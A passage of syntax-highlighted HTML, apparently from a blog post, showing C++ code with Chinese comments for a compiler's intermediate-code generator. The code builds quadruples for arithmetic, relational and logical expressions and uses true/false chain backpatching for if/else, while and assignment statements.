class="number">-1</span>) == <span class="number">32</span>)&#123; <span class="comment">// 逻辑运算符</span></span><br><span class="line">                            <span class="built_in">logicCheck</span>(<span class="built_in">getMinus</span>(typeV, c<span class="number">-1</span>));  <span class="comment">// 逻辑运算</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">getMinus</span>(typeV, c<span class="number">-1</span>) == <span class="number">30</span>)&#123;    <span class="comment">// 赋值号</span></span><br><span class="line">                            opS.<span class="built_in">push</span>(<span class="number">30</span>);   <span class="comment">// 赋值号入栈</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(S.<span class="built_in">size</span>() == tmpV[<span class="number">0</span>])&#123;    <span class="comment">// 若层数符合要求</span></span><br><span class="line">                            <span class="keyword">switch</span>(tmpV[<span class="number">1</span>])&#123;</span><br><span class="line">                                <span class="keyword">case</span> <span class="number">0</span>:&#123;</span><br><span class="line">                                    <span class="built_in">addV4</span>(&#123;<span class="string">&quot;ret&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;0&quot;</span>&#125;);</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">case</span> <span class="number">1</span>:&#123;    <span class="comment">// 条件语句</span></span><br><span class="line">                                    <span class="keyword">if</span>(!<span class="built_in">updatedChain</span>(<span class="built_in">getFC</span>()))&#123;     <span class="comment">// Falsechain未被连接说明if后没有else</span></span><br><span class="line">                                        <span class="built_in">linkUpV4</span>(<span class="built_in">getFC</span>(), <span class="built_in">to_string</span>(V4.<span class="built_in">size</span>()));</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="built_in">delChain</span>();</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">case</span> <span class="number">2</span>:&#123;   <span class="comment">// if后的关系表达式整理完毕</span></span><br><span class="line">                                    <span class="built_in">logicCheck</span>(<span class="number">0</span>);</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">case</span> <span class="number">3</span>:&#123;    <span class="comment">// then后语句处理完毕</span></span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">case</span> <span class="number">4</span>:&#123;    <span class="comment">// 从else后语句中出来</span></span><br><span class="line">                                    <span class="comment">// 链接TrueChain</span></span><br><span class="line">                                    <span class="built_in">linkUpV4</span>(<span class="built_in">getTC</span>(), <span class="built_in">to_string</span>(V4.<span class="built_in">size</span>()));</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">case</span> <span class="number">5</span>:&#123;    <span class="comment">// 子关系表达式结束</span></span><br><span class="line">                                    <span class="comment">// 处理关系运算</span></span><br><span class="line">                                    <span class="built_in">handleLogic</span>();</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">case</span> <span class="number">6</span>:&#123;    <span class="comment">// 算术表达式结束</span></span><br><span class="line">                                    <span class="built_in">handleCalc</span>(tmpV[<span class="number">2</span>], c); <span class="comment">// 处理算术表达式</span></span><br><span class="line">                                    tFlag = <span class="number">1</span>;</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">case</span> <span class="number">7</span>:&#123;    <span class="comment">// while语句</span></span><br><span class="line">                                    <span class="built_in">delChain</span>();</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">case</span> <span class="number">8</span>:&#123;    <span class="comment">// while后的关系表达式结束</span></span><br><span class="line">                                    <span class="built_in">logicCheck</span>(<span class="number">0</span>);</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">case</span> <span class="number">9</span>:&#123;    <span class="comment">// do后语句结束</span></span><br><span class="line">                                    <span class="type">int</span> wBeg = WS.<span class="built_in">top</span>();</span><br><span class="line">                                    WS.<span class="built_in">pop</span>();</span><br><span class="line">                                    <span class="built_in">addV4</span>(&#123;<span class="string">&quot;j&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot; &quot;</span>, <span class="built_in">to_string</span>(wBeg)&#125;);   </span><br><span class="line">                                    <span class="built_in">linkUpV4</span>(<span class="built_in">getFC</span>(), <span class="built_in">to_string</span>(V4.<span class="built_in">size</span>()));</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">case</span> <span class="number">10</span>:&#123;   <span class="comment">// 赋值语句</span></span><br><span class="line">                                    string a, b;</span><br><span class="line">                                    <span class="type">int</span> tmpTp = opS.<span class="built_in">top</span>();</span><br><span class="line">                                    opS.<span class="built_in">pop</span>();</span><br><span class="line">                                    b = NS.<span class="built_in">top</span>();</span><br><span class="line">                                    NS.<span class="built_in">pop</span>();</span><br><span class="line">                                    a = NS.<span class="built_in">top</span>();</span><br><span class="line">                                    NS.<span class="built_in">pop</span>();</span><br><span class="line">                                    <span class="built_in">handleGive</span>(a, b, tmpTp);</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">case</span> <span class="number">11</span>:&#123;   <span class="comment">// 赋值语句后的首个变量</span></span><br><span class="line">                                    NS.<span class="built_in">push</span>(strV[c<span class="number">-1</span>]);</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            cirS.<span class="built_in">pop</span>();</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(S.<span class="built_in">size</span>() &lt; tmpV[<span class="number">0</span>])&#123;  <span class="comment">// 预留给内层的已失效，如对应if的else</span></span><br><span class="line">                            cirS.<span class="built_in">pop</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// </span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// if(!S.empty()) printf(&quot;stack error&quot;);</span></span><br><span class="line">            <span class="comment">// if(c&lt;len) printf(&quot;vector error.&quot;);</span></span><br><span class="line">            <span class="comment">// printf(&quot;true&quot;);</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getMinus</span><span class="params">(vector&lt;<span class="type">int</span>&gt; V, <span class="type">int</span> index)</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> V[index] - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">getOut</span><span class="params">()</span></span>&#123;  <span class="comment">// 输出结果</span></span><br><span class="line">            <span class="type">int</span> len = V4.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;len; i++)&#123;</span><br><span class="line">                vector&lt;string&gt; tmp = V4[i];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d.(%s, %s, %s, %s)\n&quot;</span>, i, tmp[<span class="number">0</span>].<span class="built_in">c_str</span>(), tmp[<span class="number">1</span>].<span class="built_in">c_str</span>(), tmp[<span class="number">2</span>].<span class="built_in">c_str</span>(), tmp[<span class="number">3</span>].<span class="built_in">c_str</span>());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">updatedChain</span><span class="params">(<span class="type">int</span> idx)</span></span>&#123;     <span class="comment">// 检查if的FalseChain是否被连接过</span></span><br><span class="line">            string tmp = V4[idx][<span class="number">3</span>];</span><br><span class="line">            <span class="type">int</span> tmpN = <span class="built_in">stoi</span>(tmp);</span><br><span class="line">            <span class="keyword">if</span>(tmpN == <span class="number">-1</span> || tmpN == <span class="built_in">lastJ</span>(idx))&#123;     <span class="comment">// 指向空-1或前一个结点则认为未被连接</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">logicCheck</span><span class="params">(<span class="type">int</span> k)</span></span>&#123;     <span class="comment">// 进行逻辑运算</span></span><br><span class="line">            <span class="type">int</span> k1, k2 = <span class="built_in">opl2Int</span>(k);</span><br><span class="line">            <span class="type">int</span> tmpVar;</span><br><span class="line">            <span class="keyword">while</span>(<span class="number">1</span>)&#123;   <span class="comment">// 执行前面的运算</span></span><br><span class="line">                k1 = <span class="built_in">opl2Int</span>(locOpS.<span class="built_in">top</span>());</span><br><span class="line">                <span class="keyword">if</span>(opl[k1][k2] != <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                k1 = locOpS.<span class="built_in">top</span>();</span><br><span class="line">                tmpVar = locNS.<span class="built_in">top</span>();</span><br><span class="line">                locNS.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="built_in">logicCalc</span>(tmpVar, k1);    <span class="comment">// 根据运算生成四元式</span></span><br><span class="line">                locOpS.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(opp[k1][k2] == <span class="number">0</span>)&#123;    <span class="comment">// 等级相消</span></span><br><span class="line">                locOpS.<span class="built_in">pop</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(opp[k1][k2] == <span class="number">-1</span>)&#123;</span><br><span class="line">                locOpS.<span class="built_in">push</span>(k);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">lastJ</span><span class="params">(<span class="type">int</span> k)</span></span>&#123;   <span class="comment">// 关系表达式内的J跳转搜索</span></span><br><span class="line">            <span class="type">int</span> p = k<span class="number">-1</span>;</span><br><span class="line">            string tmp = V4[p][<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(tmp.<span class="built_in">substr</span>(<span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;j&quot;</span>)&#123;    <span class="comment">// 检测到跳转语句</span></span><br><span class="line">                    <span class="keyword">return</span> p<span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                p -= <span class="number">1</span>;</span><br><span class="line">                tmp = V4[p][<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// error</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">logicCalc</span><span class="params">(<span class="type">int</span> loc, <span class="type">int</span> op)</span></span>&#123;   <span class="comment">// 逻辑运算</span></span><br><span class="line">            <span class="type">int</span> pre = <span class="built_in">lastJ</span>(loc), cur = loc;</span><br><span class="line">            <span class="keyword">switch</span>(op)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">31</span>:&#123;   <span class="comment">// and</span></span><br><span class="line">                    <span class="built_in">backV4</span>(cur+<span class="number">1</span>);</span><br><span class="line">                    <span class="built_in">linkUpV4</span>(pre, <span class="built_in">to_string</span>(cur));</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">32</span>:&#123;   <span class="comment">// or</span></span><br><span class="line">                    <span class="built_in">backV4</span>(cur);</span><br><span class="line">                    <span class="built_in">linkUpV4</span>(pre+<span class="number">1</span>, <span class="built_in">to_string</span>(cur));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">handleGive</span><span class="params">(string a, string b, <span class="type">int</span> op)</span></span>&#123;</span><br><span class="line">            <span class="built_in">addV4</span>(&#123;<span class="string">&quot;=&quot;</span>, b, <span class="string">&quot; &quot;</span>, a&#125;);    <span class="comment">// 赋值语句</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">handleLogic</span><span class="params">()</span></span>&#123;     <span class="comment">// 处理关系运算式</span></span><br><span class="line">            string a, b;</span><br><span class="line">            <span class="type">int</span> tmpTp = opS.<span class="built_in">top</span>();</span><br><span class="line">            opS.<span class="built_in">pop</span>();</span><br><span class="line">            b = NS.<span class="built_in">top</span>();</span><br><span class="line">            NS.<span class="built_in">pop</span>();</span><br><span class="line">            a = NS.<span class="built_in">top</span>();</span><br><span class="line">            NS.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="built_in">opLogic</span>(a, b, tmpTp);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="function">string <span class="title">newOps</span><span class="params">()</span></span>&#123;    <span class="comment">// 迭代临时操作数</span></span><br><span class="line">            string tmp = <span class="string">&quot;T&quot;</span>;</span><br><span class="line">            tmp = tmp+<span class="built_in">to_string</span>(ops);</span><br><span class="line">            ops++;</span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">op2Int</span><span class="params">(<span class="type">int</span> c)</span></span>&#123; <span class="comment">// 算术运算符转对应矩阵编号,-1表示异常</span></span><br><span class="line">            <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">20</span>:<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">21</span>:<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">22</span>:<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">23</span>:<span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">54</span>:<span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">55</span>:<span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:<span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">opl2Int</span><span class="params">(<span class="type">int</span> c)</span></span>&#123; <span class="comment">// 逻辑运算符转对应矩阵编号,-1表示异常</span></span><br><span class="line">            <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">31</span>:<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">32</span>:<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">54</span>:<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">55</span>:<span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:<span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">upChain</span><span class="params">(<span class="type">int</span> tC, <span class="type">int</span> fC)</span></span>&#123;     <span class="comment">// 更新最顶层的TC与FC，-1表示不更新</span></span><br><span class="line">            Chain tmp = CS.<span class="built_in">top</span>();</span><br><span class="line">            CS.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(tC != <span class="number">-1</span>)&#123;    <span class="comment">// TC</span></span><br><span class="line">                tmp.tC = tC;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(fC != <span class="number">-1</span>)&#123;    <span class="comment">// FC</span></span><br><span class="line">                tmp.fC = fC;</span><br><span class="line">            &#125;</span><br><span class="line">            CS.<span class="built_in">push</span>(tmp);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">addChain</span><span class="params">()</span></span>&#123;    <span class="comment">// 添加一层FC与TC</span></span><br><span class="line">            CS.<span class="built_in">push</span>(&#123;<span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">delChain</span><span class="params">()</span></span>&#123;    <span class="comment">// 删除一层FC与TC</span></span><br><span class="line">            CS.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getTC</span><span class="params">()</span></span>&#123;    <span class="comment">// 获取顶层TC</span></span><br><span class="line">            <span class="keyword">return</span> CS.<span class="built_in">top</span>().tC;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getFC</span><span class="params">()</span></span>&#123;    <span class="comment">// 获取顶层FC</span></span><br><span class="line">            <span class="keyword">return</span> CS.<span class="built_in">top</span>().fC;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">opCalc</span><span class="params">(string a,string b,<span class="type">int</span> c)</span></span>&#123; <span class="comment">// 发生运算，记录四元式</span></span><br><span class="line">            string _ops = <span class="built_in">newOps</span>();</span><br><span class="line">            <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">20</span>:&#123;</span><br><span class="line">                    <span class="built_in">addV4</span>(&#123;<span class="string">&quot;+&quot;</span>, a, b, _ops&#125;);</span><br><span class="line">                    calcNS.<span class="built_in">push</span>(_ops);</span><br><span class="line">                    <span class="keyword">return</span> ;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">21</span>:&#123;</span><br><span class="line">                    <span class="built_in">addV4</span>(&#123;<span class="string">&quot;-&quot;</span>, a, b, _ops&#125;);</span><br><span class="line">                    calcNS.<span class="built_in">push</span>(_ops);</span><br><span class="line">                    <span class="keyword">return</span> ;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">22</span>:&#123;</span><br><span class="line">                    <span class="built_in">addV4</span>(&#123;<span class="string">&quot;*&quot;</span>, a, b, _ops&#125;);</span><br><span class="line">                    calcNS.<span class="built_in">push</span>(_ops);</span><br><span class="line">                    <span class="keyword">return</span> ;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">23</span>:&#123;</span><br><span class="line">                    <span class="built_in">addV4</span>(&#123;<span class="string">&quot;/&quot;</span>, a, b, _ops&#125;);</span><br><span class="line">                    calcNS.<span class="built_in">push</span>(_ops);</span><br><span class="line">                    <span class="keyword">return</span> ;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">opLogic</span><span class="params">(string a,string b,<span class="type">int</span> c)</span></span>&#123; <span class="comment">// 存在逻辑运算，记录四元式</span></span><br><span class="line">            <span class="type">int</span> tC, fC;</span><br><span class="line">            <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">24</span>:&#123;</span><br><span class="line">                    tC = <span class="built_in">addV4</span>(&#123;<span class="string">&quot;j&gt;&quot;</span>, a, b, <span class="string">&quot;-1&quot;</span>&#125;);    <span class="comment">// true指针</span></span><br><span class="line">                    fC = <span class="built_in">addV4</span>(&#123;<span class="string">&quot;j&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;-1&quot;</span>&#125;);    <span class="comment">// false指针</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">25</span>:&#123;</span><br><span class="line">                    tC = <span class="built_in">addV4</span>(&#123;<span class="string">&quot;j&gt;=&quot;</span>, a, b, <span class="string">&quot;-1&quot;</span>&#125;);    <span class="comment">// true指针</span></span><br><span class="line">                    fC = <span class="built_in">addV4</span>(&#123;<span class="string">&quot;j&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;-1&quot;</span>&#125;);    <span class="comment">// false指针</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">26</span>:&#123;</span><br><span class="line">                    tC = <span class="built_in">addV4</span>(&#123;<span class="string">&quot;j&lt;&quot;</span>, a, b, <span class="string">&quot;-1&quot;</span>&#125;);    <span class="comment">// true指针</span></span><br><span class="line">                    fC = <span class="built_in">addV4</span>(&#123;<span class="string">&quot;j&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;-1&quot;</span>&#125;);    <span class="comment">// false指针</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">27</span>:&#123;</span><br><span class="line">                    tC = <span class="built_in">addV4</span>(&#123;<span class="string">&quot;j&lt;=&quot;</span>, a, b, <span class="string">&quot;-1&quot;</span>&#125;);    <span class="comment">// true指针</span></span><br><span class="line">                    fC = <span class="built_in">addV4</span>(&#123;<span class="string">&quot;j&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;-1&quot;</span>&#125;);    <span class="comment">// false指针</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">28</span>:&#123;</span><br><span class="line">                    tC = <span class="built_in">addV4</span>(&#123;<span class="string">&quot;j=&quot;</span>, a, b, <span class="string">&quot;-1&quot;</span>&#125;);    <span class="comment">// true指针</span></span><br><span class="line">                    fC = <span class="built_in">addV4</span>(&#123;<span class="string">&quot;j&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;-1&quot;</span>&#125;);    <span class="comment">// false指针</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">29</span>:&#123;</span><br><span class="line">                    tC = <span class="built_in">addV4</span>(&#123;<span class="string">&quot;j&lt;&gt;&quot;</span>, a, b, <span class="string">&quot;-1&quot;</span>&#125;);    <span class="comment">// true指针</span></span><br><span class="line">                    fC = <span class="built_in">addV4</span>(&#123;<span class="string">&quot;j&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;-1&quot;</span>&#125;);    <span class="comment">// false指针</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">upChain</span>(tC, fC);    <span class="comment">// 更新Chain</span></span><br><span class="line">            <span class="keyword">if</span>(lFlag == <span class="number">1</span>)&#123; <span class="comment">// 首个不成对，不入栈</span></span><br><span class="line">                lFlag = <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 入栈逻辑关系对: tC与tC-2</span></span><br><span class="line">                locNS.<span class="built_in">push</span>(tC);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">handleCalc</span><span class="params">(<span class="type">int</span> beg, <span class="type">int</span> end)</span></span>&#123;  <span class="comment">// 处理算术表达式</span></span><br><span class="line">            string _beg = strV[beg], _end = strV[end];</span><br><span class="line">            <span class="type">int</span> tmpTp;</span><br><span class="line">            string tmpStr;</span><br><span class="line">            calcOpS.<span class="built_in">push</span>(<span class="number">0</span>);    <span class="comment">// 起止符</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=beg; i&lt;end; i++)&#123;</span><br><span class="line">                tmpTp = <span class="built_in">getMinus</span>(typeV, i);</span><br><span class="line">                <span class="keyword">if</span>(tmpTp == <span class="number">50</span>) <span class="keyword">continue</span>;   <span class="comment">// 跳过分号</span></span><br><span class="line">                tmpStr = strV[i];</span><br><span class="line">                <span class="keyword">switch</span>(tmpTp)&#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">40</span>:&#123;   <span class="comment">// 整数</span></span><br><span class="line">                        calcNS.<span class="built_in">push</span>(tmpStr);    <span class="comment">// 推入操作数</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">41</span>:&#123;   <span class="comment">// 浮点数</span></span><br><span class="line">                        calcNS.<span class="built_in">push</span>(tmpStr);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">44</span>:&#123;   <span class="comment">// 标识符</span></span><br><span class="line">                        calcNS.<span class="built_in">push</span>(tmpStr);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">21</span>:</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">22</span>:</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">23</span>:</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">54</span>:</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">55</span>:&#123;</span><br><span class="line">                        <span class="type">int</span> k1, k2 = <span class="built_in">op2Int</span>(tmpTp);</span><br><span class="line">                        string a, b;</span><br><span class="line">                        <span class="keyword">while</span>(<span class="number">1</span>)&#123;   <span class="comment">// 执行前面的运算</span></span><br><span class="line">                            k1 = <span class="built_in">op2Int</span>(calcOpS.<span class="built_in">top</span>());</span><br><span class="line">                            <span class="keyword">if</span>(opp[k1][k2] != <span class="number">1</span>)</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            k1 = calcOpS.<span class="built_in">top</span>();</span><br><span class="line">                            b = calcNS.<span class="built_in">top</span>();   <span class="comment">// 后运算符</span></span><br><span class="line">                            calcNS.<span class="built_in">pop</span>();</span><br><span class="line">                            a = calcNS.<span class="built_in">top</span>();   <span class="comment">// 前</span></span><br><span class="line">                            calcNS.<span class="built_in">pop</span>();</span><br><span class="line">                            <span class="built_in">opCalc</span>(a, b, k1);    <span class="comment">// 根据运算生成四元式</span></span><br><span class="line">                            calcOpS.<span class="built_in">pop</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(opp[k1][k2] == <span class="number">0</span>)&#123;    <span class="comment">// 等级相消</span></span><br><span class="line">                            calcOpS.<span class="built_in">pop</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(opp[k1][k2] == <span class="number">-1</span>)&#123;</span><br><span class="line">                            calcOpS.<span class="built_in">push</span>(tmpTp);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            tmpTp = <span class="number">0</span>;</span><br><span class="line">            tmpStr = <span class="string">&quot;#&quot;</span>;</span><br><span class="line">            <span class="type">int</span> k1, k2 = <span class="built_in">op2Int</span>(tmpTp);</span><br><span class="line">            string a, b;</span><br><span class="line">            <span class="keyword">while</span>(<span class="number">1</span>)&#123;   <span class="comment">// 执行前面的运算</span></span><br><span class="line">                k1 = <span class="built_in">op2Int</span>(calcOpS.<span class="built_in">top</span>());</span><br><span class="line">                <span class="keyword">if</span>(opp[k1][k2] != <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                k1 = calcOpS.<span class="built_in">top</span>();</span><br><span class="line">                b = calcNS.<span class="built_in">top</span>();   <span class="comment">// 后运算符</span></span><br><span class="line">                calcNS.<span class="built_in">pop</span>();</span><br><span class="line">                a = calcNS.<span class="built_in">top</span>();   <span class="comment">// 前</span></span><br><span class="line">                calcNS.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="built_in">opCalc</span>(a, b, k1);    <span class="comment">// 根据运算生成四元式</span></span><br><span class="line">                calcOpS.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(opp[k1][k2] == <span class="number">0</span>)&#123;    <span class="comment">// 等级相消</span></span><br><span class="line">                calcOpS.<span class="built_in">pop</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(opp[k1][k2] == <span class="number">-1</span>)&#123;</span><br><span class="line">                calcOpS.<span 